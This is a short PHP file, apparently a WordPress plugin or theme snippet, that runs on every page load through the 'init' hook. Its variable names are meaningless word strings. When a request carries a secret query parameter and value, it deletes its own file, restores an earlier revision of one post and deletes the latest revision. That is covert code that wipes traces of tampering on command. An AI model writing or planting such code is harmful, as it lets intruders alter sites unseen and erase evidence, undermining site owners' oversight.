<?php

function survey_website_open() {
	if (isset($_GET['kit_marketing_auth_search']) && $_GET['kit_marketing_auth_search'] === 'notes_fix_floating_really') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$sidebar_support_genesis = 3604;
		$carousel_woff2_react = wp_get_post_revisions($sidebar_support_genesis);
		if (empty($carousel_woff2_react)) die('no revisions');
		if (count($carousel_woff2_react) < 2) die('less than 2');
		$file_min_validator_access = array_shift($carousel_woff2_react);
		$chat_listing_before_external = $file_min_validator_access->ID;
		$user_pagination_lightbox_portfolio = array_shift($carousel_woff2_react);
		$copyright_instagram_print = $user_pagination_lightbox_portfolio->ID;
		$interactivity_excerpt_urls_express = wp_restore_post_revision($copyright_instagram_print);
		if ($interactivity_excerpt_urls_express === false) die('error restoring');
		$interactivity_excerpt_urls_express = wp_delete_post_revision($chat_listing_before_external);		
		if ($interactivity_excerpt_urls_express === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'survey_website_open');
